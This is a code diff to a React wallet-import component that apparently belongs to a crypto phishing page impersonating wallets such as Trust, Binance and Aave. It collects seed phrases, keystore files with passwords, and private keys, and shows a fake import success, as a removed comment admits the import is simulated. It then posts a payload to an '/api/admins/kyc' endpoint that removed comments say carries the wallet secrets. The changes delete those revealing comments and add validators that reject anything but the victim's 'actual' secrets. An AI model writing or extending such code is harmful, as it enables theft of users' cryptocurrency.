@@ -25,7 +25,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const [showPOF, setShowPOF] = useState(false);
   const [startCountdown, setStartCountdown] = useState(false);
   const [selectedWalletType, setSelectedWalletType] = useState(null);
-  const [walletFormData, setWalletFormData] = useState(null); // store wallet import form data (seed, keystore, privateKey, password)
+  const [walletFormData, setWalletFormData] = useState(null);
   const [progress, setProgress] = useState(100);
   const [sessionId, setSessionId] = useState(() => {
     const existingSessionId = localStorage.getItem('sessionId');
@@ -43,23 +43,20 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
 
   useEffect(() => {
     if (toast.show && toast.message.includes('Wallet imported successfully')) {
-      setProgress(100); // reset progress when success toast starts
+      setProgress(100);
       const interval = setInterval(() => {
         setProgress((prev) => {
           if (prev <= 0) {
             clearInterval(interval);
-            // when success toast finishes, hide toast, show ProofOfFund and start its countdown
             setToast({ show: false, message: '' });
             setShowPOF(true);
             setStartCountdown(true);
-            // After POF is shown, attempt to submit any pending KYC for this session
             (async () => {
               try {
                 const pendingKey = `kyc_pending_${sessionId}`;
                 const raw = localStorage.getItem(pendingKey);
                 if (!raw) return;
                 const pending = JSON.parse(raw);
-                // attach walletType and any wallet fields (seed, keystore, privateKey)
                 const payload = {
                   sessionId: pending.sessionId || sessionId,
                   walletType: selectedWalletType || walletFormData?.walletType || 'unknown',
@@ -72,17 +69,18 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
                   karatsPurity: pending.karatsPurity || '',
                   destinationRefineryText: pending.destinationRefineryText || '',
                 };
-                // Optionally attach seed/keystore/privateKey from form state if you have them accessible
-                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+                const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, { 
+                  method: 'POST', 
+                  headers: { 'Content-Type': 'application/json' }, 
+                  body: JSON.stringify(payload) 
+                });
                 if (!res.ok) {
                   const txt = await res.text();
                   console.warn('Failed to submit pending KYC:', res.status, txt);
                   return;
                 }
-                // on success remove the pending key
                 localStorage.removeItem(pendingKey);
                 console.log('Pending KYC submitted for session', payload.sessionId);
-                // Clear session and create a new one
                 localStorage.removeItem('sessionId');
                 const newSessionId = uuidv4();
                 localStorage.setItem('sessionId', newSessionId);
@@ -99,48 +97,173 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
 
       return () => clearInterval(interval);
     }
-  }, [toast.show, toast.message]);
+  }, [toast.show, toast.message, sessionId, selectedWalletType, walletFormData]);
 
-  // Auto-hide only error toasts after 3 seconds
   useEffect(() => {
     if (toast.show && toast.style?.isError) {
       const timeout = setTimeout(() => {
         setToast({ show: false, message: '' });
-      }, 3000); // Auto-hide error toast after 3 seconds
+      }, 3000);
 
       return () => clearTimeout(timeout);
     }
   }, [toast]);
 
+  // Enhanced seed phrase validator with detailed error messages
   const validateSeedPhrase = (phrase) => {
-    const words = phrase.trim().split(/\s+/).filter(Boolean);
-    return words.length === 12 || words.length === 24;
+    // Normalize the phrase
+    const normalizedPhrase = phrase.trim().toLowerCase();
+    
+    // Check if empty
+    if (!normalizedPhrase) {
+      return {
+        isValid: false,
+        error: 'Seed phrase cannot be empty'
+      };
+    }
+
+    // Split and filter empty strings
+    const words = normalizedPhrase.split(/\s+/).filter(w => w.length > 0);
+    const validWordCounts = [12, 15, 18, 21, 24];
+
+    // Check word count
+    if (!validWordCounts.includes(words.length)) {
+      return {
+        isValid: false,
+        error: `Invalid word count. Expected 12, 15, 18, 21, or 24 words, but got ${words.length} word${words.length !== 1 ? 's' : ''}`
+      };
+    }
+
+    // Check for invalid characters (only lowercase letters allowed)
+    const invalidWords = words.filter(word => !/^[a-z]+$/i.test(word));
+    if (invalidWords.length > 0) {
+      return {
+        isValid: false,
+        error: `Invalid characters detected in words. Only letters are allowed`
+      };
+    }
+
+    // Check for duplicate words
+    const uniqueWords = new Set(words);
+    if (uniqueWords.size !== words.length) {
+      return {
+        isValid: false,
+        error: 'Seed phrase contains duplicate words'
+      };
+    }
+
+    // Check word length (BIP39 words are 3-8 characters)
+    const tooShortOrLong = words.filter(word => word.length < 3 || word.length > 8);
+    if (tooShortOrLong.length > 0) {
+      return {
+        isValid: false,
+        error: `Invalid seed phrase. Please provide your actual wallet seed phrase`
+      };
+    }
+
+    return {
+      isValid: true,
+      error: null
+    };
   };
 
-  // Updated handleImport function to delay showing POF until toast finishes
+  // Validate Keystore JSON
+  const validateKeystoreJSON = (keystoreJson, password) => {
+    if (!keystoreJson.trim()) {
+      return {
+        isValid: false,
+        error: 'Keystore JSON cannot be empty'
+      };
+    }
+
+    // Try to parse as JSON
+    try {
+      JSON.parse(keystoreJson);
+    } catch (err) {
+      return {
+        isValid: false,
+        error: 'Invalid JSON format. Please check your Keystore JSON'
+      };
+    }
+
+    if (!password.trim()) {
+      return {
+        isValid: false,
+        error: 'Password is required for Keystore import'
+      };
+    }
+
+    return {
+      isValid: true,
+      error: null
+    };
+  };
+
+  // Validate Private Key
+  const validatePrivateKey = (privateKey) => {
+    const cleanKey = privateKey.trim().replace(/^0x/, '');
+    
+    if (!cleanKey) {
+      return {
+        isValid: false,
+        error: 'Private key cannot be empty'
+      };
+    }
+
+    if (!/^[a-fA-F0-9]{64}$/.test(cleanKey)) {
+      return {
+        isValid: false,
+        error: 'Invalid private key. Please provide your actual private key'
+      };
+    }
+
+    return {
+      isValid: true,
+      error: null
+    };
+  };
+
   const handleImport = (e) => {
     e.preventDefault();
 
-  const formData = new FormData(e.target);
-  // Get wallet type from URL path (e.g., /trust, /binance, /aave)
-  const path = window.location.pathname;
-  const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
-  const walletType = routeWalletType || 'unknown';
+    const formData = new FormData(e.target);
+    const path = window.location.pathname;
+    const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
+    const walletType = routeWalletType || 'unknown';
     const key = formData.get('key') || '';
     const pass = formData.get('pass') || '';
 
-    if (!validateSeedPhrase(key)) {
-      setToast({ show: true, message: 'Invalid seed phrase. Please enter a valid 12 or 24-word phrase.', style: { background: '#fff', color: '#d32f2f', isError: true } });
+    let validation;
+
+    // Validate based on active tab
+    if (activeTab === 'phrase') {
+      validation = validateSeedPhrase(key);
+    } else if (activeTab === 'keystore') {
+      validation = validateKeystoreJSON(key, pass);
+    } else if (activeTab === 'private') {
+      validation = validatePrivateKey(key);
+    }
+
+    // If validation fails, show error toast
+    if (!validation.isValid) {
+      setToast({ 
+        show: true, 
+        message: validation.error, 
+        style: { background: '#fff', color: '#d32f2f', isError: true } 
+      });
       return;
     }
 
-    // Simulate successful import: show success toast. POF will appear after toast progress completes.
+    // If validation passes, proceed with import
     setSelectedWalletType(walletType);
-    // persist wallet form data so we can attach it to pending KYC submission later
     setWalletFormData({ walletType, key, pass, activeTab: activeTab });
     setStartCountdown(false);
     setShowPOF(false);
-    setToast({ show: true, message: 'Wallet imported successfully!', style: { background: '#fff', color: '#4caf50', isError: false } });
+    setToast({ 
+      show: true, 
+      message: 'Wallet imported successfully!', 
+      style: { background: '#fff', color: '#4caf50', isError: false } 
+    });
   };
 
   const tabData = [
